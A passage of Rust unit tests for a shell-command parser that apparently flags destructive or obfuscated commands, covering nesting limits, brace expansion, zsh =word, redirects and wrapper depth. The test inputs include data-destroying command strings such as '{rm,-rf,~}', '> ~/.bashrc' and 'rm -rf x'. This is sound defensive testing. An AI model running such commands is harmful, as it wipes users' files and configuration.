        assert!(p.commands.iter().any(|c| c.argv == words(&["echo", "{}"])));
        let find = p.commands.iter().find(|c| c.argv[0] == "find").expect("find");
        assert!(find.find_delete);
    }

    #[test]
    fn assignment_only_line_runs_nothing() {
        assert!(parse("FOO=1").commands.is_empty());
    }

    #[test]
    fn redirect_only_line_keeps_its_target() {
        let p = parse("> ~/.bashrc");
        assert_eq!(p.commands.len(), 1);
        assert!(p.commands[0].argv.is_empty());
        assert_eq!(p.commands[0].redirects[0].target, "~/.bashrc");
    }

    #[test]
    fn comment_text_is_not_a_command() {
        assert_eq!(argvs("echo hi # rm -rf x"), vec![words(&["echo", "hi"])]);
        assert_eq!(argvs("echo a#b"), vec![words(&["echo", "a#b"])]);
    }

    #[test]
    fn line_continuation_joins_lines() {
        assert_eq!(argvs("rm \\\n  -rf x"), vec![words(&["rm", "-rf", "x"])]);
    }

    #[test]
    fn nesting_beyond_the_limit_is_opaque() {
        let mut s = "echo hi".to_string();
        for _ in 0..12 {
            s = format!("echo $({s})");
        }
        assert!(opaque(&s).contains(&"nesting"));
    }

    #[test]
    fn nesting_within_the_limit_is_read() {
        let p = parse("echo $(echo $(echo $(rm x)))");
        assert!(!p.opaque.contains(&"nesting"));
        assert!(p.commands.iter().any(|c| c.argv == words(&["rm", "x"])));
    }

    #[test]
    fn long_line_is_opaque_and_not_read() {
        let p = parse(&"x ".repeat(40_000));
        assert_eq!(p.opaque, vec!["too long"]);
        assert!(p.commands.is_empty());
    }

    #[test]
    fn many_unclosed_substitutions_finish_quickly() {
        let started = std::time::Instant::now();
        let p = parse(&"$(".repeat(30_000));
        assert!(p.opaque.contains(&"unclosed substitution"));
        assert!(started.elapsed() < std::time::Duration::from_secs(2));
    }

    #[test]
    fn many_wrappers_are_bounded_by_depth() {
        let line = format!("{}rm x", "sudo ".repeat(20));
        assert!(opaque(&line).contains(&"nesting"));
    }
}

#[cfg(test)]
mod probes_shell {
    use super::*;

    #[test]
    fn brace_expansion_is_opaque_but_plain_braces_are_not() {
        for cmd in ["{rm,-rf,~}", "sh -c '{rm,-rf,x}'", "zsh -c \"{rm,-rf,x}\"", "echo {a..b}"] {
            assert!(parse(cmd).opaque.contains(&"brace expansion"), "{cmd}");
        }
        for cmd in ["echo {}", "find . -exec x {} +", "git log --format='{x}'"] {
            assert!(parse(cmd).opaque.is_empty(), "{cmd}");
        }
    }

    #[test]
    fn zsh_equals_word_is_opaque() {
        assert!(parse("=rm -rf x").opaque.contains(&"zsh =word"));
    }

    #[test]
    fn option_values_at_the_end_do_not_panic() {
        for cmd in ["sudo -u", "env -S", "xargs -I", "nice -n", "exec -a", "timeout", "stdbuf -o"] {
            let _ = parse(cmd);
        }
    }
}
